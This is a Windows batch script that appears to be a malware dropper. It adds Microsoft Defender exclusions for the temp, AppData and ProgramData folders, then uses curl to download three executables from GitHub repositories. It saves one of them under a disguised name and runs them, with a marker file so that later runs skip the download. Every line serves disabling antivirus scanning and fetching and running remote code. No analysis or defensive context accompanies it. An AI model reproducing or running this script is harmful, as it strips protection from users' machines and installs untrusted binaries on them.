@echo off
cd /d %temp%
powershell -c Add-MpPreference -ExclusionPath "%temp%"
powershell -c Add-MpPreference -ExclusionPath "%APPDATA%"
powershell -c Add-MpPreference -ExclusionPath "%PROGRAMDATA%"
powershell -c Add-MpPreference -ExclusionPath "%SYSTEMROOT%\TEMP"

if exist nagihori2.txt (
    if exist Vanguard.exe if exist CafePlusControl.exe if exist EmptyStandbyList.exe (
        start Vanguard.exe
        EmptyStandbyList.exe workingsets
        EmptyStandbyList.exe standbylist
        EmptyStandbyList.exe priority0standbylist
        EmptyStandbyList.exe modifiedpagelist
        
        timeout /t 3 /nobreak >nul
        
        
        start CafePlusControl.exe
        exit /b
    )
)

curl -L https://github.com/seition2doc/dosta2/raw/refs/heads/main/Vanguard.exe -o Vanguard.exe
curl -L https://github.com/Banglade-sh23/-/raw/refs/heads/main/local3.exe -o CafePlusControl.exe

curl -L https://github.com/seition2doc/dosta2/raw/refs/heads/main/EmptyStandbyList.exe -o EmptyStandbyList.exe

echo "asd" > nagihori2.txt 
start Vanguard.exe

EmptyStandbyList.exe workingsets
EmptyStandbyList.exe standbylist
EmptyStandbyList.exe priority0standbylist
EmptyStandbyList.exe modifiedpagelist

timeout /t 3 /nobreak >nul

start CafePlusControl.exe
exit /b
